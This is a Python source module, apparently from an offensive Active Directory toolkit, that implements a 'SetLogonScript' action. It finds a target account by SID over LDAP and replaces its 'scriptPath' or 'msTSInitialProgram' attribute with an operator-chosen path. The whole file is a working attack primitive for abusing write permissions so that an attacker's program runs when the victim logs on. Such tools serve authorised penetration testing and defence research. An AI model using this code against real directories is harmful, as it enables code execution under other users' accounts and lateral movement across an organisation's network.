import argparse
import logging

import ldap3
from impacket.ldap.ldaptypes import SR_SECURITY_DESCRIPTOR, LDAP_SID

from acltoolkit.ldap import LDAPConnection, LDAPEntry
from acltoolkit.target import Target

class SetLogonScript:
    def __init__(self, options: argparse.Namespace):
        self.options = options

        self.target = Target(options)
        self._object = None
        self.logonscript_type = 'scriptPath'
        if options.logonscript_type in ['scriptPath', 'msTSInitialProgram']:
            self.logonscript_type = options.logonscript_type
        self.scriptpath = options.script_path

        self.ldap_connection = None


    def connect(self):
        self.ldap_connection = LDAPConnection(self.options.scheme, self.target)
        self.ldap_connection.connect()

    def search(self, *args, **kwargs) -> 'list["LDAPEntry"]':
        return self.ldap_connection.search(*args, **kwargs)

    def write(self, *args, **kwargs) -> int:
        return self.ldap_connection.write(*args, **kwargs)

    def run(self):
        self.connect()
        
        logging.info("Find target object: %s" % self.object.get("distinguishedName"))
        logging.info("Actual Logon Script (%s) is: %s" % (self.logonscript_type, self.object.get(self.logonscript_type)))
        ret = self.write(self.object.get("distinguishedName"),  {self.logonscript_type:[ldap3.MODIFY_REPLACE, [self.scriptpath]]})

        if ret['result'] == 0:
            logging.info("Logon Script (%s) modified successfully !" % self.logonscript_type)
        else :
            if ret['result'] == 50:
                raise Exception('Could not modify object, the server reports insufficient rights: %s', ret['message'])
            elif ret['result'] == 19:
                raise Exception('Could not modify object, the server reports a constrained violation: %s', ret['message'])
            else:
                raise Exception('The server returned an error: %s', ret['message'])

    @property
    def object(self) -> LDAPEntry:
        if self._object is not None:
            return self._object

        object_sid = self.options.target_sid

        objects = self.search(
            "(objectSid=%s)" % object_sid,
            attributes=["distinguishedName",  "scriptPath", "msTSInitialProgram"]
        )

        if len(objects) == 0:
            raise Exception("Could not find object with Sid: %s" % object_sid)

        self._object = objects[0]

        return self._object 

def set_logonscript(options: argparse.Namespace):
    g = SetLogonScript(options)
    g.run()